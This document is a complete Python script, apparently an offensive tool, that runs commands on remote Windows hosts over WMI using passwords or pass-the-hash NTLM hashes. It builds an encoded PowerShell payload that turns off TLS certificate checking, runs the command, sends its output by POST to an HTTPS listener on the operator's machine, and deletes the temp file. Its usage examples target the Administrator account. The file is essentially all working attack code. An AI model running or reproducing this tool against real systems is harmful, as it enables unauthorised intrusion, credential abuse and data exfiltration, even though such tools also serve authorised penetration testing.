#!/usr/bin/env python3
"""
WMI process execution with HTTPS-based output retrieval.
Requires: pip install impacket
"""

import sys
import os
import ssl
import uuid
import socket
import random
import argparse
import tempfile
import threading
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL


# Globals for server coordination
output_received = threading.Event()
output_data = b""
verbose = False


def log(msg: str):
    """Print message only if verbose mode is enabled."""
    if verbose:
        print(msg)


def get_local_ip(target: str) -> str:
    """Get the local IP address used to reach a target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"


def find_available_port(start: int = 10000, end: int = 30000) -> int:
    """Find an available port in the given range, retrying every second."""
    while True:
        port = random.randint(start, end)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.close()
            log(f"[*] Found available port: {port}")
            return port
        except OSError:
            log(f"[*] Port {port} unavailable, retrying...")
            import time
            time.sleep(1)


def generate_ssl_cert(cert_file: str, key_file: str):
    """Generate a self-signed SSL certificate using openssl."""
    log("[*] Generating SSL certificate...")
    cmd = [
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", key_file,
        "-out", cert_file,
        "-days", "1", "-nodes",
        "-subj", "/CN=localhost"
    ]
    try:
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("[*] SSL certificate generated")
    except subprocess.CalledProcessError:
        print("[!] Failed to generate SSL certificate (is openssl installed?)")
        sys.exit(1)


class OutputHandler(BaseHTTPRequestHandler):
    """HTTP handler for receiving command output via POST."""

    def do_POST(self):
        global output_data
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            output_data = self.rfile.read(content_length)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            output_received.set()
        except Exception as e:
            log(f"[!] Error receiving output: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        if verbose:
            super().log_message(format, *args)


def start_https_server(port: int, cert_file: str, key_file: str) -> HTTPServer:
    """Start HTTPS server for receiving output."""
    server = HTTPServer(("0.0.0.0", port), OutputHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_file, key_file)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    return server


def build_powershell_command(command: str, output_file: str, server_url: str) -> str:
    """Build the PowerShell script that executes command and uploads output."""
    import base64

    # Base64 encode the user's command (UTF-16LE for PowerShell -enc)
    user_cmd_encoded = base64.b64encode(command.encode("utf-16-le")).decode("ascii")

    # PowerShell script with TLS cert bypass
    # Executes user command via -enc, captures output, uploads via HTTPS
    ps_script = f'''
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {{
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {{
        return true;
    }}
}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

powershell.exe -enc {user_cmd_encoded} | Out-File -FilePath "{output_file}" -Encoding UTF8
$bytes = [System.IO.File]::ReadAllBytes("{output_file}")
Invoke-WebRequest -Uri "{server_url}" -Method POST -Body $bytes -UseBasicParsing | Out-Null
Remove-Item -Path "{output_file}" -Force
'''
    # Encode wrapper script as base64 for safe transport
    encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
    return f'powershell.exe -EncodedCommand {encoded}'


def wmi_exec(target: str, username: str, password: str, command: str,
             domain: str = "", hashes: str = "", get_output: bool = False,
             timeout: int = 30) -> str | None:
    """
    Execute a command via WMI.

    Args:
        target: Target IP or hostname
        username: Username for authentication
        password: Password for authentication
        command: Command to execute
        domain: Domain (optional)
        hashes: NTLM hashes in LMHASH:NTHASH format (optional, for pass-the-hash)
        get_output: Whether to retrieve command output via HTTPS
        timeout: Timeout in seconds for output retrieval

    Returns:
        Command output if get_output=True, None otherwise
    """
    global output_data, output_received

    # Parse hashes if provided
    lmhash = ""
    nthash = ""
    if hashes:
        if ":" in hashes:
            lmhash, nthash = hashes.split(":", 1)
        else:
            # Assume it's just the NT hash
            nthash = hashes

    # Reset globals
    output_data = b""
    output_received.clear()

    server = None
    server_thread = None
    temp_dir = None

    try:
        if get_output:
            # Setup HTTPS server for output retrieval
            temp_dir = tempfile.mkdtemp()
            cert_file = os.path.join(temp_dir, "cert.pem")
            key_file = os.path.join(temp_dir, "key.pem")

            generate_ssl_cert(cert_file, key_file)

            port = find_available_port()
            local_ip = get_local_ip(target)
            server_url = f"https://{local_ip}:{port}/"

            log(f"[*] Starting HTTPS server on {local_ip}:{port}")
            server = start_https_server(port, cert_file, key_file)

            # Run server in background thread
            server_thread = threading.Thread(target=server.handle_request, daemon=True)
            server_thread.start()

            # Build PowerShell command with output upload
            output_file = f"C:\\Windows\\Temp\\{uuid.uuid4()}.txt"
            full_command = build_powershell_command(command, output_file, server_url)
            log(f"[*] Output will be uploaded to {server_url}")
        else:
            full_command = command

        # Connect via DCOM
        log(f"[*] Connecting to {target}...")
        dcom = DCOMConnection(target, username, password, domain, lmhash, nthash)

        try:
            # Get WMI interface
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)

            # Login to namespace
            iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
            iWbemLevel1Login.RemRelease()

            # Get Win32_Process class
            win32_process, _ = iWbemServices.GetObject("Win32_Process")

            # Call Create method
            log(f"[*] Executing command...")
            win32_process.Create(full_command, "C:\\", None)

            if not get_output:
                print(f"[+] Executed: {command}")
                return None

        finally:
            dcom.disconnect()

        # Wait for output
        if get_output:
            log(f"[*] Waiting for output (timeout: {timeout}s)...")
            if output_received.wait(timeout=timeout):
                result = output_data.decode("utf-8", errors="replace")
                # Strip BOM and whitespace
                result = result.lstrip("\ufeff").strip()
                print(result)
                return result
            else:
                print("[!] Timeout waiting for output")
                return None

    finally:
        # Cleanup
        if server:
            server.server_close()
        if temp_dir:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)


def main():
    global verbose

    parser = argparse.ArgumentParser(
        description="WMI remote command execution with optional output retrieval",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Execute with password
  %(prog)s 192.168.1.10 -u Administrator -p 'password' -x 'whoami' -o

  # Pass-the-hash
  %(prog)s 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -x 'whoami' -o

  # Blank password (if neither -p nor -H supplied)
  %(prog)s 192.168.1.10 -u Administrator -x 'whoami' -o

  # With domain
  %(prog)s 192.168.1.10 -u Administrator -p 'password' -d MYDOMAIN -x 'whoami' -o
"""
    )

    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-H", "--hashes", metavar="[LMHASH:]NTHASH",
                        help="NTLM hashes for pass-the-hash")
    parser.add_argument("-d", "--domain", default="", help="Domain")
    parser.add_argument("-x", "--execute", required=True, metavar="CMD",
                        help="Command to execute")
    parser.add_argument("-o", "--output", action="store_true",
                        help="Retrieve command output via HTTPS callback")
    parser.add_argument("-t", "--timeout", type=int, default=30,
                        help="Timeout for output retrieval (default: 30s)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show verbose output (HTTPS server activity, etc.)")

    args = parser.parse_args()
    verbose = args.verbose

    # Use blank password if neither -p nor -H supplied
    password = args.password
    hashes = args.hashes or ""

    wmi_exec(
        target=args.target,
        username=args.username,
        password=password,
        command=args.execute,
        domain=args.domain,
        hashes=hashes,
        get_output=args.output,
        timeout=args.timeout
    )


if __name__ == "__main__":
    main()
